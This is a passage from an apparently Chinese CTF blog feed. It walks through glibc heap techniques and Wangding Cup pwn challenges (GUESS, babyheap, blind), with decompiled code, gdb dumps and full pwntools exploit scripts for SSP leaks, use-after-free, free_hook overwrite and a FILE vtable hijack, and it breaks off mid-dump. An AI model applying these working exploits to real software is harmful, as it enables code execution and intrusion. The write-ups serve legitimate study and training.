class="line">// the first chunk does not merge with the top chunk on freeing</span><br><span class="line">malloc(len);                                    // points to address 0x1a440a0</span><br><span class="line"></span><br><span class="line">// This chunk will end up in unsorted bin</span><br><span class="line">free(ptr);</span><br><span class="line"></span><br><span class="line">real_chunk = (struct small_chunk *)(ptr - 2);   // points to address 0x1a44000</span><br><span class="line"></span><br><span class="line">// Grab another chunk with greater size so as to prevent getting back</span><br><span class="line">// the same one. Also, the previous chunk will now go from unsorted to</span><br><span class="line">// small bin</span><br><span class="line">malloc(len + 0x10);                             // points to address 0x1a44130</span><br><span class="line"></span><br><span class="line">// Make the real small chunk&apos;s bk pointer point to &amp;fake_chunk</span><br><span class="line">// This will insert the fake chunk in the smallbin</span><br><span class="line">real_chunk-&gt;bk = &amp;fake_chunk;</span><br><span class="line">// and fake_chunk&apos;s fd point to the small chunk</span><br><span class="line">// This will ensure that &apos;victim-&gt;bk-&gt;fd == victim&apos; for the real chunk</span><br><span class="line">fake_chunk.fd = real_chunk;</span><br><span class="line"></span><br><span class="line">// We also need this &apos;victim-&gt;bk-&gt;fd == victim&apos; test to pass for fake chunk</span><br><span class="line">fake_chunk.bk = &amp;another_fake_chunk;</span><br><span class="line">another_fake_chunk.fd = &amp;fake_chunk;</span><br><span class="line"></span><br><span class="line">// Remove the real chunk by a standard call to malloc</span><br><span class="line">malloc(len);                                    // points at address 0x1a44010</span><br><span class="line"></span><br><span class="line">// Next malloc for that size will return the fake chunk</span><br><span class="line">victim = malloc(len);                           // points at address 0x7ffdeb37d060</span><br></pre></td></tr></table></figure><p>注释已经说得很清楚了，就不再赘述了</p>]]></content>
      
      <categories>
          
          <category> pwn </category>
          
      </categories>
      
      
        <tags>
            
            <tag> pwn </tag>
            
            <tag> heap </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>网鼎杯pwn复现</title>
      <link href="/2018/12/28/%E7%BD%91%E9%BC%8E%E6%9D%AFpwn%E5%A4%8D%E7%8E%B0/"/>
      <url>/2018/12/28/%E7%BD%91%E9%BC%8E%E6%9D%AFpwn%E5%A4%8D%E7%8E%B0/</url>
      <content type="html"><![CDATA[<p><em>第一次打比赛便被网鼎杯血虐，当时栈溢出的水平不足以达到唯一的一个栈溢出的题目的要求，堆就更不必多说了。</em><br><em>现在在学习堆的中间回来看看有没有能力去复现当时的题。</em></p><h1 id="GUESS"><a href="#GUESS" class="headerlink" title="GUESS"></a>GUESS</h1><h2 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h2><p>还是比较清晰的，将flag.txt的内容读到了栈上，我们就是想方设法将其输出出来；</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line">__int64 __fastcall main(__int64 a1, char **a2, char **a3)</span><br><span class="line">&#123;</span><br><span class="line">  __WAIT_STATUS stat_loc; // [rsp+14h] [rbp-8Ch]</span><br><span class="line">  int v5; // [rsp+1Ch] [rbp-84h]</span><br><span class="line">  __int64 i; // [rsp+20h] [rbp-80h]</span><br><span class="line">  __int64 max_num_3; // [rsp+28h] [rbp-78h]</span><br><span class="line">  char flag_is_here; // [rsp+30h] [rbp-70h]</span><br><span class="line">  char s2; // [rsp+60h] [rbp-40h]</span><br><span class="line">  unsigned __int64 canary; // [rsp+98h] [rbp-8h]</span><br><span class="line"></span><br><span class="line">  canary = __readfsqword(0x28u);</span><br><span class="line">  max_num_3 = 3LL;</span><br><span class="line">  LODWORD(stat_loc.__uptr) = 0;</span><br><span class="line">  i = 0LL;</span><br><span class="line">  setvbuf_and_alarm();</span><br><span class="line">  HIDWORD(stat_loc.__iptr) = open(&quot;./flag.txt&quot;, 0, a2);</span><br><span class="line">  if ( HIDWORD(stat_loc.__iptr) == -1 )</span><br><span class="line">  &#123;</span><br><span class="line">    perror(&quot;./flag.txt&quot;);</span><br><span class="line">    _exit(-1);</span><br><span class="line">  &#125;</span><br><span class="line">  read(SHIDWORD(stat_loc.__iptr), &amp;flag_is_here, 0x30uLL);</span><br><span class="line">  close(SHIDWORD(stat_loc.__iptr));             // read flag.txt </span><br><span class="line">                                                // </span><br><span class="line">                                                // </span><br><span class="line">                                                // </span><br><span class="line">                                                // </span><br><span class="line">  puts(&quot;This is GUESS FLAG CHALLENGE!&quot;);</span><br><span class="line">  while ( 1 )</span><br><span class="line">  &#123;</span><br><span class="line">    if ( i &gt;= max_num_3 )</span><br><span class="line">    &#123;</span><br><span class="line">      puts(&quot;you have no sense... bye :-) &quot;);</span><br><span class="line">      return 0LL;</span><br><span class="line">    &#125;</span><br><span class="line">    v5 = get_fork();</span><br><span class="line">    if ( !v5 )</span><br><span class="line">      break;</span><br><span class="line">    ++i;</span><br><span class="line">    wait((__WAIT_STATUS)&amp;stat_loc);</span><br><span class="line">  &#125;</span><br><span class="line">  puts(&quot;Please type your guessing flag&quot;);</span><br><span class="line">  gets(&amp;s2);</span><br><span class="line">  if ( !strcmp(&amp;flag_is_here, &amp;s2) )</span><br><span class="line">    puts(&quot;You must have great six sense!!!! :-o &quot;);</span><br><span class="line">  else</span><br><span class="line">    puts(&quot;You should take more effort to get six sence, and one more challenge!!&quot;);</span><br><span class="line">  return 0LL;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h2><p>程序有canary，溢出点也很清晰；<br>这里就涉及到了canary的ssp leak；<br>因为只有三次机会，我们需要的就是栈地址；<br>所以第一次得到libc地址，第二次可以用environ变量得到栈地址，第三次读flag即可。</p><p>当时卡住的地方是栈地址的泄露：<br>  栈的地址可以通过libc中的一个变量 _environ变量泄露出来。因为在libc中的全局变量 environ储存着该程序环境变量的地址，而环境变量是储存在栈上的，所以可以泄露栈地址，进而计算出flag在栈上的地址。</p><h2 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">context.log_level = &apos;debug&apos;</span><br><span class="line"></span><br><span class="line">sh = process(&apos;./GUESS&apos;)</span><br><span class="line">libc = ELF(&apos;./libc.so.6&apos;)</span><br><span class="line"></span><br><span class="line">puts_got = 0x602020</span><br><span class="line"></span><br><span class="line">sh.recvuntil(&quot;guessing flag\n&quot;)</span><br><span class="line">sh.sendline(p64(puts_got)*0x100)</span><br><span class="line"></span><br><span class="line">sh.recvuntil(&quot;*** stack smashing detected ***: &quot;)</span><br><span class="line">gdb.attach(sh)</span><br><span class="line"></span><br><span class="line">puts_addr = u64(sh.recvn(6).ljust(8,&apos;\x00&apos;))</span><br><span class="line">libc.address = puts_addr- libc.symbols[&apos;puts&apos;]</span><br><span class="line"></span><br><span class="line">environ = libc.symbols[&apos;environ&apos;]</span><br><span class="line"></span><br><span class="line">sh.recvuntil(&quot;guessing flag\n&quot;)</span><br><span class="line">sh.sendline(p64(environ)*0x100)</span><br><span class="line"></span><br><span class="line">sh.recvuntil(&quot;*** stack smashing detected ***: &quot;)</span><br><span class="line">#gdb.attach(sh)</span><br><span class="line"></span><br><span class="line">stack_addr = u64(sh.recvn(6).ljust(8,&apos;\x00&apos;))</span><br><span class="line"></span><br><span class="line">sh.recvuntil(&quot;guessing flag\n&quot;)</span><br><span class="line">sh.sendline(p64(stack_addr -0x168)*0x100)</span><br><span class="line"></span><br><span class="line">sh.interactive()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">结果如下：</span><br><span class="line"></span><br><span class="line">You should take more effort to get six sence, and one more challenge!!</span><br><span class="line">*** stack smashing detected ***: flag&#123;Th1s_1S_Fl3g&#125;</span><br><span class="line">me terminated</span><br></pre></td></tr></table></figure><h1 id="babyheap"><a href="#babyheap" class="headerlink" title="babyheap"></a>babyheap</h1><h2 id="题目-1"><a href="#题目-1" class="headerlink" title="题目"></a>题目</h2><p>题目写的还是比较清晰的，功能如下</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">int menu()</span><br><span class="line">&#123;</span><br><span class="line">  puts(&quot;1.alloc&quot;);</span><br><span class="line">  puts(&quot;2.edit&quot;);</span><br><span class="line">  puts(&quot;3.show&quot;);</span><br><span class="line">  puts(&quot;4.free&quot;);</span><br><span class="line">  puts(&quot;5.exit&quot;);</span><br><span class="line">  return printf(&quot;Choice:&quot;);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>alloc 会分配固定0x30大小的chunk，最多alloc 9次；<br>edit 可以选择修改chunk，最多edit 3次 ， 与alloc均不存在溢出的可能；<br>show 会将内容打印出来；<br>free 将chunk free掉，有明显的UAF漏洞。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">$ checksec babyheap</span><br><span class="line">[*] &apos;/home/sirius/tikool/wangdingbei/babyheap/babyheap&apos;</span><br><span class="line">    Arch:     amd64-64-little</span><br><span class="line">    RELRO:    Full RELRO</span><br><span class="line">    Stack:    Canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      No PIE (0x400000)</span><br></pre></td></tr></table></figure><h2 id="分析-1"><a href="#分析-1" class="headerlink" title="分析"></a>分析</h2><p>保护基本上全开，为了拿到shell，我们选择修改malloc_hook或free_hook来执行system(‘/bin/sh’)或使用one_gadget拿shell；</p><p>为了能够修改free_hook,我们需要leak libc的基址，但是程序只会固定malloc(0x20),也就是0x30大小的chunk，该chunk属于fastbin，而众所周知，fastbin是没办法泄露libc基址的，因此我们需要smallbin；</p><p>为了能够搞到smallbin，我们决定利用free的漏洞，当连续free两个chunk时，后free的fastbin的fd指针会指向先free的chunk，然后我们show便可以泄露堆地址；</p><p>当泄露出堆地址之后，我们可以修改fd指针的指向地址，这样malloc时便会到我们想要的地址，所以我们有机会来让修改chunk能够使其去伪造smallbin大小的chunk，这样想方设法将其free之后，其fd指针与bk指针指向&lt;main_arena+88&gt;处，这样show便可以泄露libc地址。</p><p>不过最终要控制malloc 与 edit的次数，在有限的次数内完成功能， 不得已的话再想办法修改edit的次数限制。</p><h2 id="exp-1"><a href="#exp-1" class="headerlink" title="exp"></a>exp</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">context.log_level = &apos;debug&apos;</span><br><span class="line">p = process(&apos;./babyheap&apos;)</span><br><span class="line">elf = ELF(&apos;./babyheap&apos;)</span><br><span class="line">libc = ELF(&apos;./libc.so.6&apos;)</span><br><span class="line"></span><br><span class="line">def Add(index, data):</span><br><span class="line">    p.recvuntil(&apos;Choice:&apos;)</span><br><span class="line">    p.sendline(&apos;1&apos;)</span><br><span class="line">    p.recvuntil(&apos;Index:&apos;)</span><br><span class="line">    p.sendline(str(index))</span><br><span class="line">    p.recvuntil(&apos;Content:&apos;)</span><br><span class="line">    p.send(data)</span><br><span class="line"></span><br><span class="line">def Edit(index, data):</span><br><span class="line">    p.recvuntil(&apos;Choice:&apos;)</span><br><span class="line">    p.sendline(&apos;2&apos;)</span><br><span class="line">    p.recvuntil(&apos;Index:&apos;)</span><br><span class="line">    p.sendline(str(index))</span><br><span class="line">    p.recvuntil(&apos;Content:&apos;)</span><br><span class="line">    p.send(data)</span><br><span class="line"></span><br><span class="line">def Show(index):</span><br><span class="line">    p.recvuntil(&apos;Choice:&apos;)</span><br><span class="line">    p.sendline(&apos;3&apos;)</span><br><span class="line">    p.recvuntil(&apos;Index:&apos;)</span><br><span class="line">    p.sendline(str(index))</span><br><span class="line"></span><br><span class="line">def Delete(index):</span><br><span class="line">    p.recvuntil(&apos;Choice:&apos;)</span><br><span class="line">    p.sendline(&apos;4&apos;)</span><br><span class="line">    p.recvuntil(&apos;Index:&apos;)</span><br><span class="line">    p.sendline(str(index))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Add(0,&apos;aaaaaaaa\n&apos;)</span><br><span class="line">Add(1,&apos;bbbbbbbb\n&apos;)</span><br><span class="line">Add(2,&apos;cccccccc\n&apos;)</span><br><span class="line">Add(3,&apos;dddddddd\n&apos;)</span><br><span class="line"></span><br><span class="line">#--------------leak heap addr----------------</span><br><span class="line">Add(4, p64(0xa0) + p64(0x31) + p64(0x602080 - 0x18) + p64(0x602080 - 0x10))</span><br><span class="line">Add(5, p64(0x30) + p64(0x30) + &apos;\n&apos;)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Delete(1)</span><br><span class="line">Delete(0)</span><br><span class="line"></span><br><span class="line">Show(0)</span><br><span class="line">heap_addr = u64(p.recvline()[ : -1].ljust(8, &apos;\x00&apos;)) - 0x30</span><br><span class="line">print &quot;heap_addr: &quot; + hex(heap_addr)</span><br><span class="line"></span><br><span class="line">``</span><br><span class="line">pwndbg&gt; x/10gx 0x0000000000602060     &lt;---chunk_ptr 0-5</span><br><span class="line">0x602060:0x00000000011e20100x00000000011e2040</span><br><span class="line">0x602070:0x00000000011e20700x00000000011e20a0</span><br><span class="line">0x602080:0x00000000011e20d00x00000000011e2100</span><br><span class="line">0x602090:0x00000000000000000x0000000000000000</span><br><span class="line">0x6020a0:0x00000000000000000x0000000000000000</span><br><span class="line"></span><br><span class="line">pwndbg&gt; x/40gx 0x000000000011e2000</span><br><span class="line">0x11e2000:0x00000000000000000x0000000000000031</span><br><span class="line">0x11e2010:0x00000000011e2030 &lt;--- get heap addr0x0000000000000000</span><br><span class="line">0x11e2020:0x00000000000000000x0000000000000000</span><br><span class="line">0x11e2030:0x00000000000000000x0000000000000031</span><br><span class="line">0x11e2040:0x00000000000000000x0000000000000000</span><br><span class="line">0x11e2050:0x00000000000000000x0000000000000000</span><br><span class="line">0x11e2060:0x00000000000000000x0000000000000031</span><br><span class="line">0x11e2070:0x63636363636363630x0000000000000000</span><br><span class="line">0x11e2080:0x00000000000000000x0000000000000000</span><br><span class="line">0x11e2090:0x00000000000000000x0000000000000031</span><br><span class="line">0x11e20a0:0x64646464646464640x0000000000000000</span><br><span class="line">0x11e20b0:0x00000000000000000x0000000000000000</span><br><span class="line">0x11e20c0:0x00000000000000000x0000000000000031</span><br><span class="line">0x11e20d0:0x00000000000000a00x0000000000000031</span><br><span class="line">0x11e20e0:0x00000000006020680x0000000000602070</span><br><span class="line">0x11e20f0:0x00000000000000000x0000000000000031</span><br><span class="line">0x11e2100:0x00000000000000300x0000000000000030</span><br><span class="line">0x11e2110:0x00000000000000000x0000000000000000</span><br><span class="line">0x11e2120:0x00000000000000000x0000000000020ee1</span><br><span class="line">0x11e2130:0x00000000000000000x0000000000000000</span><br><span class="line">``</span><br><span class="line"></span><br><span class="line">#-------------leak libc addr--------------------</span><br><span class="line">Edit(0, p64(heap_addr + 0x20) + p64(0) + p64(0) + p64(0x31))</span><br><span class="line"></span><br><span class="line">gdb.attach(p)</span><br><span class="line"></span><br><span class="line">Add(6, p64(0) + p64(0xa1) + &apos;\n&apos;)</span><br><span class="line">Add(7, p64(0) + p64(0xa1) + &apos;\n&apos;)</span><br><span class="line"></span><br><span class="line">gdb.attach(p)</span><br><span class="line"></span><br><span class="line">Delete(1)</span><br><span class="line">Show(1)</span><br><span class="line">libc_address = u64(p.recvline()[ : -1].ljust(8, &apos;\x00&apos;))-0x3c4b78</span><br><span class="line">print &quot;libc_addr: &quot; + hex(libc_address)</span><br><span class="line"></span><br><span class="line">gdb.attach(p)</span><br><span class="line"></span><br><span class="line">``</span><br><span class="line">pwndbg&gt; x/10gx 0x0000000000602060  &lt;---- chunk_ptr 0-7</span><br><span class="line">0x602060:0x00000000011e20100x00000000011e2040</span><br><span class="line">0x602070:0x00000000011e20700x00000000011e20a0</span><br><span class="line">0x602080:0x00000000006020680x00000000011e2100</span><br><span class="line">0x602090:0x00000000011e20100x00000000011e2030 &lt;---被带偏的chunk</span><br><span class="line">0x6020a0:0x00000000000000000x0000000000000000</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">pwndbg&gt; x/40gx 0x000000000011e2000</span><br><span class="line">0x11e2000:0x00000000000000000x0000000000000031</span><br><span class="line">0x11e2010:0x00000000000000000x00000000000000a1</span><br><span class="line">0x11e2020:0x00000000000000000x0000000000000031</span><br><span class="line">0x11e2030:0x00000000000000000x00000000000000d1 &lt;-----fake small chunk</span><br><span class="line">0x11e2040:0x00007f042e615b780x00007f042e615b78 &lt;-----get libc addr </span><br><span class="line">0x11e2050:0x00000000000000000x0000000000000000</span><br><span class="line">0x11e2060:0x00000000000000000x0000000000000031</span><br><span class="line">0x11e2070:0x63636363636363630x0000000000000000</span><br><span class="line">0x11e2080:0x00000000000000000x0000000000000000</span><br><span class="line">0x11e2090:0x00000000000000000x0000000000000031</span><br><span class="line">0x11e20a0:0x64646464646464640x0000000000000000</span><br><span class="line">0x11e20b0:0x00000000000000000x0000000000000000</span><br><span class="line">0x11e20c0:0x00000000000000000x0000000000000031</span><br><span class="line">0x11e20d0:0x00000000000000a00x0000000000000031</span><br><span class="line">0x11e20e0:0x00000000006020680x0000000000602070</span><br><span class="line">0x11e20f0:0x00000000000000000x0000000000000031</span><br><span class="line">0x11e2100:0x00000000000000d00x0000000000000030</span><br><span class="line">0x11e2110:0x00000000000000000x0000000000000000</span><br><span class="line">0x11e2120:0x00000000000000000x0000000000020ee1</span><br><span class="line">0x11e2130:0x00000000000000000x0000000000000000</span><br><span class="line">``</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">#---------cover free_hook with one_gadget to get shell --------------------------</span><br><span class="line">one_gadget = 0x45216</span><br><span class="line">free_hook = libc_address + 0x3c67a8</span><br><span class="line">print &quot;free_hook: &quot;+ hex(free_hook)</span><br><span class="line"></span><br><span class="line">Edit(4,p64(free_hook) + &apos;\n&apos;)</span><br><span class="line">Edit(1, p64(libc_address + one_gadget)[:-1] + &apos;\n&apos;)</span><br><span class="line"></span><br><span class="line">Delete(1)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h1 id="blind"><a href="#blind" class="headerlink" title="blind"></a>blind</h1><h2 id="题目-2"><a href="#题目-2" class="headerlink" title="题目"></a>题目</h2><p>题目风格与babyheap基本一致：<br>malloc的chunk大小变为0x68 最后得到的chunk也就是0x70,最多6个chunk；<br>edit函数功能一致，去掉了次数限制，show函数被去掉；<br>free函数仍然存在UAF，且限制3次。<br>同时添加了一个system(‘/bin/sh’)的函数。</p><h2 id="分析-2"><a href="#分析-2" class="headerlink" title="分析"></a>分析</h2><p>直接给了system(‘/bin/sh’)的函数，所以目标就是控制程序执行该函数；<br>看了半天没有头绪，能知道利用UAF漏洞将chunk分配到想要的地方，但是因为没有show函数，并没有办法泄露栈地址；<br>去看了下大佬们的思路，发现是将chunk malloc到bss段，而bss段存在着_IO_FILE的结构体及vtable虚表指针，我们通过修改指针指向，之后伪造file结构体及伪造虚表指针，程序在退出时会自动调用从而拿到shell。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; x/6gx 0x602020    &lt;---------bss段的file指针</span><br><span class="line">0x602020 &lt;stdout&gt;:0x00007ffff7dd26200x0000000000000000 </span><br><span class="line">0x602030 &lt;stdin&gt;:0x00007ffff7dd18e00x0000000000000000</span><br><span class="line">0x602040 &lt;stderr&gt;:0x00007ffff7dd25400x0000000000000000</span><br><span class="line"></span><br><span class="line">pwndbg&gt; x/28gx 0x00007ffff7dd2620             &lt;----------stdout的结构体</span><br><span class="line">0x7ffff7dd2620 &lt;_IO_2_1_stdout_&gt;:0x00000000fbad28870x00007ffff7dd26a3</span><br><span class="line">0x7ffff7dd2630 &lt;_IO_2_1_stdout_+16&gt;:0x00007ffff7dd26a30x00007ffff7dd26a3</span><br><span class="line">0x7ffff7dd2640 &lt;_IO_2_1_stdout_+32&gt;:0x00007ffff7dd26a30x00007ffff7dd26a3</span><br><span class="line">0x7ffff7dd2650 &lt;_IO_2_1_stdout_+48&gt;:0x00007ffff7dd26a30x00007ffff7dd26a3</span><br><span class="line">0x7ffff7dd2660 &lt;_IO_2_1_stdout_+64&gt;:0x00007ffff7dd26a40x0000000000000000</span><br><span class="line">0x7ffff7dd2670 &lt;_IO_2_1_stdout_+80&gt;:0x00000000000000000x0000000000000000</span><br><span class="line">0x7ffff7dd2680 &lt;_IO_2_1_stdout_+96&gt;:0x00000000000000000x00007ffff7dd18e0</span><br><span class="line">0x7ffff7dd2690 &lt;_IO_2_1_stdout_+112&gt;:0x00000000000000010xffffffffffffffff</span><br><span class="line">0x7ffff7dd26a0 &lt;_IO_2_1_stdout_+128&gt;:0x000000000a0000000x00007ffff7dd3780</span><br><span class="line">0x7ffff7dd26b0 &lt;_IO_2_1_stdout_+144&gt;:0xffffffffffffffff0x0000000000000000</span><br><span class="line">0x7ffff7dd26c0 &lt;_IO_2_1_stdout_+160&gt;:0x00007ffff7dd17a00x0000000000000000</span><br><span class="line">0x7ffff7dd26d0 &lt;_IO_2_1_stdout_+176&gt;:0x00000000000000000x0000000000000000</span><br><span class="line">0x7ffff7dd26e0 &lt;_IO_2_1_stdout_+192&gt;:0x00000000ffffffff0x0000000000000000</span><br><span class="line">0x7ffff7dd26f0 &lt;_IO_2_1_stdout_+208&gt;:0x00000000000000000x00007ffff7dd06e0</span><br><span class="line"></span><br><span class="line">pwndbg&gt; p  *(struct _IO_FILE_plus *) stdout     &lt;--------结构体含义</span><br><span class="line">$4 = &#123;</span><br><span class="line">  file = &#123;</span><br><span class="line">    _flags = -72537977, </span><br><span class="line">    _IO_read_ptr = 0x7ffff7dd26a3 &lt;_IO_2_1_stdout_+131&gt; &quot;\n&quot;, </span><br><span class="line">    _IO_read_end = 0x7ffff7dd26a3 &lt;_IO_2_1_stdout_+131&gt; &quot;\n&quot;, </span><br><span class="line">    _IO_read_base = 0x7ffff7dd26a3 &lt;_IO_2_1_stdout_+131&gt; &quot;\n&quot;, </span><br><span class="line">    _IO_write_base = 0x7ffff7dd26a3 &lt;_IO_2_1_stdout_+131&gt; &quot;\n&quot;, </span><br><span class="line">    _IO_write_ptr = 0x7ffff7dd26a3 &lt;_IO_2_1_stdout_+131&gt; &quot;\n&quot;, </span><br><span class="line">    _IO_write_end = 0x7ffff7dd26a3 &lt;_IO_2_1_stdout_+131&gt; &quot;\n&quot;, </span><br><span class="line">    _IO_buf_base = 0x7ffff7dd26a3 &lt;_IO_2_1_stdout_+131&gt; &quot;\n&quot;, </span><br><span class="line">    _IO_buf_end = 0x7ffff7dd26a4 &lt;_IO_2_1_stdout_+132&gt; &quot;&quot;, </span><br><span class="line">    _IO_save_base = 0x0, </span><br><span class="line">    _IO_backup_base = 0x0, </span><br><span class="line">    _IO_save_end = 0x0, </span><br><span class="line">    _markers = 0x0, </span><br><span class="line">    _chain = 0x7ffff7dd18e0 &lt;_IO_2_1_stdin_&gt;, </span><br><span class="line">    _fileno = 1, </span><br><span class="line">    _flags2 = 0, </span><br><span class="line">    _old_offset = -1, </span><br><span class="line">    _cur_column = 0, </span><br><span class="line">    _vtable_offset = 0 &apos;\000&apos;, </span><br><span class="line">    _shortbuf = &quot;\n&quot;, </span><br><span class="line">    _lock = 0x7ffff7dd3780 